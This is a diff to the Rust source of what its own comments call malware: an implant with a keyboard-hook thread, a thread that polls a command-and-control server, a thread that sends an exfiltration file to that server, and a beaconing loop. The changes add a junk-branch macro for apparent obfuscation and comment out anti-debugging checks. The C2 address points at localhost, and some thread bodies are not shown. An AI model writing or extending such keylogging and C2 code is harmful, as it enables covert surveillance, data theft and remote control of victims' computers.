@@ -18,19 +18,43 @@ macro_rules! unwrap_or_panic {
         }   
     };
 }
+
+macro_rules! dead_branches {
+    ($proc_name:expr, $list:expr) => {{
+        let mut detected = false;
+
+        // Dead if-branches — never true
+        if 2 + 2 == 5 {
+            println!("Debugger not detected.");
+        }
+
+        if "apple" == "orange" {
+            println!("This will never happen.");
+        }
+
+
+        // Another misleading branch
+        if std::env::var("TOTALLY_REAL_ENV").unwrap_or_default() == "true" {
+            std::process::exit(0); // never reached
+        }
+
+
+    }};
+}
+
+
 #[tokio::main]
 async fn main() {
 
     //anti sandbox
     // sleep(Duration::from_secs(600)).await;
 
-    check_for_debugging();
-    check_for_process();
-
+    // check_for_debugging();
+    // check_for_process();
 
     const URL: &'static str = "http://127.0.0.1:5000";
 
-
+    //All the mutex code for sharing with different threads 
     let paused = Arc::new(AtomicBool::new(false));
     let server = Arc::new(server::Connection::new(&URL));
     let arch = get_windows_version();
@@ -49,6 +73,7 @@ async fn main() {
 
     let paused_hook = Arc::clone(&paused);
 
+    //thread that handels keyboard hooks
     tokio::spawn(async move {
         loop {
             if paused_hook.load(Ordering::Relaxed) {
@@ -63,8 +88,11 @@ async fn main() {
         }
     });
 
+    dead_branches!("AHHH", "HAHH");
+
     let paused_command = Arc::clone(&paused);
     
+    //thread that request for commands
     tokio::spawn(async move {
         let mut rng = StdRng::from_os_rng();
         loop {
@@ -79,10 +107,12 @@ async fn main() {
         }
     });
 
+
     let paused_exfil = Arc::clone(&paused);
 
     let mut rng = StdRng::from_os_rng();
 
+    //thread that reads exfill file, and sends it off to the server
     tokio::spawn(async move {
         loop {
             if paused_exfil.load(Ordering::Relaxed) {
@@ -99,6 +129,8 @@ async fn main() {
         }
     });
 
+    dead_branches!("AHHH", "HAHH");
+
     // Main loop for beaconing
     loop {
         match server_for_beconing.becon(&id_beconing).await {
@@ -114,10 +146,16 @@ async fn main() {
     }
 }
 
+
+//function that executes the command read from the c2 server
 async fn execute_command(cmd: &str, paused: Arc<AtomicBool>) {
     let cmds: Vec<_> = cmd.split(':').collect();
 
+    dead_branches!("AHHH", "HAHH");
+
     match cmds[0] {
+
+        //if it's a slp sleep the malware
         "slp" => {
 
             if let Ok(secs) = cmds[1].replace('\n', "").parse() {
@@ -127,9 +165,12 @@ async fn execute_command(cmd: &str, paused: Arc<AtomicBool>) {
                 paused.store(false, Ordering::Relaxed);
             }
         }
+        //if it's shd shut down the malware
         "shd" => {
             std::process::exit(1);
         }
+
+        //if it's pwn print
         "pwn" => {
             println!("{}", cmds[1]);
         }
